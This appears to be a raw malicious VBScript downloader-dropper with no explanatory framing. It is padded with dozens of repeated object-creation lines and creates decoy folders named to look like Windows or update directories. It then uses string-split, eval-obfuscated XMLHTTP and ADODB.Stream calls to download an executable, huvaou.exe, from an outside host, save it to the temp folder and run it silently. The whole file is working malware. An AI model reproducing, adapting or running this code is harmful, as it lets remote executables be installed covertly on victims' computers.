On error resume next
On error resume next
Set myhh123 = CreateObject("Wscript.Shell")
Set tomyurl = CreateObject("Wscript.Shell")

Set gozx = WScript.CreateObject("WScript.Shell") 
Set WshShell = WScript.CreateObject("WScript.Shell")
Set WshShell = WScript.CreateObject("WScript.Shell")
temp1 = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)
Set FSO = CreateObject("Scripting.FileSystemObject")
strDesktop = WshShell.SpecialFolders("Desktop")    '�����ļ��С����桱  C:\Documents and Settings\Administrator\����\
Set fsss = CreateObject("Scripting.FileSystemObject")
WD = fsss.GetSpecialFolder(0)
ss = fsss.GetParentFolderName(WD)                    'ϵͳ��Ŀ¼c:\
allUsersStartup = wshShell.SpecialFolders("AllUsersStartup") '�����û�����Ŀ¼
allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") 'ȫ���û�����ͼ��
iePath=ss&"Program Files\Internet Explorer\IEXPLORE.exe"

Sub AddNewFolder(FolderName)
Dim fs
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
Set fs = CreateObject("scripting.FileSystemObject") 
If Not fs.FolderExists(FolderName) Then
  fs.CreateFolder FolderName
End If
Set fs = Nothing 
end sub

Call AddNewFolder(ss&"Progra~1\w"+"indsupdate\")
Call AddNewFolder(ss&"WINDOWS1")
Call AddNewFolder(ss&"WINDOWS\360")

cppp=ss&"Progra~1\w"+"indsupdate\"
csss=ss&"WINDOWS1\"
go360=ss&"WINDOWS\360\"

Sub getp(downtp,downto)
Set senw = CreateObject("Mic"&"rosoft.XM"&"L"&"HTTP")
Set rrrr1 = CreateObject("ADOD"&"B.Strea"&"m")
with senw
.Open "GET",downtp,0
.Send()
end with
b=senw.responseBody
with rrrr1
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("senw.res"&"po"&"nse"&"Bod"&"y")
.SaveToFile downto,eval ("2")
end with
rrrr1.close
end sub


call getp("http://down.cdnhy.com:1267/soft/huvaou.exe",temp1&"\huvaou.exe")
gozx.Run temp1&"\huvaou.exe", , True